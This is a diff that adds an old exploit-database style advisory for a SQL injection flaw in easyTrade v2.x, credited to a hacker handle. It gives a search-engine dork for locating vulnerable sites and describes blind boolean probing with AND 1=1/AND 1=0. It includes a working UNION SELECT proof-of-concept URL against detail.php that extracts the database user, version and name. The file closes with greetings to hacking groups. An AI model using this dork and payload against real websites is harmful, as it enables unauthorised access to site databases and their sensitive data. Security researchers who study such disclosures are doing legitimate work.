@@ -1,0 +1,36 @@
+######################
+#
+#easyTrade v2.x SQL Injection Vulnerability
+#
+######################
+#
+#Bug by: h0yt3r
+#
+#Dork: "powered by easytrade"
+#
+##
+###
+##
+#
+#Script suffers from a not correctly verified detail id variable which is used in SQL Querys.
+#An Attacker can easily get sensitive information from the database by
+#injecting unexpected SQL Querys.
+#
+#We dont get any SQL Errors when the Injection Query appear to be false.
+#However we have to look for content changing when we inject.
+#Look at AND 1=1/AND 1=0
+#
+#SQL Injection:
+#http://[target]/[path]/detail.php?id=[SQL]
+#
+#PoC:
+#detail.php?id=-1%20union%20select%20USER(),2,3,4,5,@@VERSION,7,8,9,10,11,12,13,database(),15,16
+#
+#######################
+#
+#Greetz to b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team!
+#
+#######################
+####################### 
+
+# milw0rm.com [2008-06-17]
